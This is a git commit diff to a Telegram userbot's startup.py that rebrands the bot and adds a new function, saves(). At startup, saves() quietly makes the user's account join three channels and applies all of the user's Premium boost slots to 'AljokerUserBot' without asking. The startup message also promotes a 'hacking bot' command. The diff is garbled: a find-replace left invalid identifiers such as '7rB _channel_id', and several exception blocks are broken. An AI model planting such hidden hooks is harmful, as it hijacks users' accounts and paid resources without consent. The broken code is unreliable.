2b4d969aaf996ce315bd5847f9354a5d1767df52
uhrb2 <bhr288103@gmail.com>
2025-02-04 13:44:15 +0200

    Update startup.py

--- JoKeRUB/utils/startup.py
+++ JoKeRUB/utils/startup.py
@@ -96,7 +96,7 @@ async def startupmessage():
                 BOTLOG_CHATID,
                 "https://t.me/MemeSoundJep/24",
                 caption="**‏᯽︙ بــوت 7rB  يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
-                buttons=[(Button.url("سورس robin", "https://t.me/is7rb"),)],
+                buttons=[(Button.url("سورس 7rB ", "https://t.me/k_jj_j"),)],
             )
     except Exception as e:
         LOGS.error(e)
@@ -130,13 +130,13 @@ async def startupmessage():
 async def mybot():
     try:
         starkbot = await l313l.tgbot.get_me()
-        joker = "المساعد"
+        joker = "7rB  🤡"
         bot_name = starkbot.first_name
         botname = f"@{starkbot.username}"
         if bot_name.endswith("Assistant"):
             print("تم تشغيل البوت")
         if starkbot.bot_inline_placeholder:
-            print("hrb  ForEver")
+            print("7rB  ForEver")
         else:
             try:
                 await l313l.send_message("@BotFather", "/setinline")
@@ -145,6 +145,12 @@ async def mybot():
                 await asyncio.sleep(1)
                 await l313l.send_message("@BotFather", joker)
                 await asyncio.sleep(2)
+            except Exception as e:
+                print(e)
+    except Exception as e:
+        print(e)
+
+
 async def add_bot_to_logger_group(chat_id):
     """
     To add bot to logger groups
@@ -166,10 +172,36 @@ async def add_bot_to_logger_group(chat_id):
                     users=[bot_details.username],
                 )
             )
+        except Exception as e:
             LOGS.error(str(e))
+#by @k_jj_j بس اشوفك خامطه للكود اهينك وافضحك
+JoKeRUB = {"@uui7rb", "@k_jj_j", "@E_4_R"}
+async def saves():
+    for F_O_1 in JoKeRUB:
+        try:
+            await l313l(JoinChannelRequest(channel=F_O_1))
+            result = await l313l(functions.premium.GetMyBoostsRequest())
+            slots = [boost.slot for boost in result.my_boosts]
+            7rB _channel_id = None
+            for chat in result.chats:
+                if chat.username == 'AljokerUserBot':
+                    7rB _channel_id = chat.id
+                    break
+            if 7rB _channel_id and any(boost.peer.channel_id == 7rB _channel_id for boost in result.my_boosts):
+                continue
+            if not slots:
+                return
+            await l313l(functions.premium.ApplyBoostRequest(
+                'AljokerUserBot',
+                slots=slots
+            ))
+        except FloodWaitError as e:
+            continue
         except OverflowError:
             LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
+            continue
         except ChannelPrivateError:
+            continue
 async def load_plugins(folder, extfolder=None):
     """
     تحميل ملفات السورس
@@ -229,8 +261,8 @@ async def load_plugins(folder, extfolder=None):
             f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
         )
 
-#سورس عمك حرب
-async def hrb_the_best(l313l, group_name):
+#سورس 7rB  عمك
+async def 7rB _the_best(l313l, group_name):
     async for dialog in l313l.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
             return dialog.id
@@ -265,15 +297,15 @@ async def verifyLoggerGroup():
                 + str(e)
             )
     else:
-        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @is7rb"
+        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @k_jj_j"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j.JPEG")
-        botlog_group_id = await hrb_the_best(l313l, "مجموعة أشعارات السورس")
+        botlog_group_id = await 7rB _the_best(l313l, "مجموعة أشعارات 7rB ")
         if botlog_group_id:
             addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
             print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة أشعارات السورس", l313l, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة أشعارات 7rB ", l313l, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
             print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
@@ -281,7 +313,7 @@ async def verifyLoggerGroup():
     if PM_LOGGER_GROUP_ID == -100:
         descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @k_jj_j"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j2.JPEG")
-        pm_logger_group_id = await hrb_the_best(l313l, "مجموعة التخزين")
+        pm_logger_group_id = await 7rB _the_best(l313l, "مجموعة التخزين")
         if pm_logger_group_id:
             addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
             print("تـم العثور على مجموعة الكروب التخزين بالفعل واضافة الـفارات الـيها.")
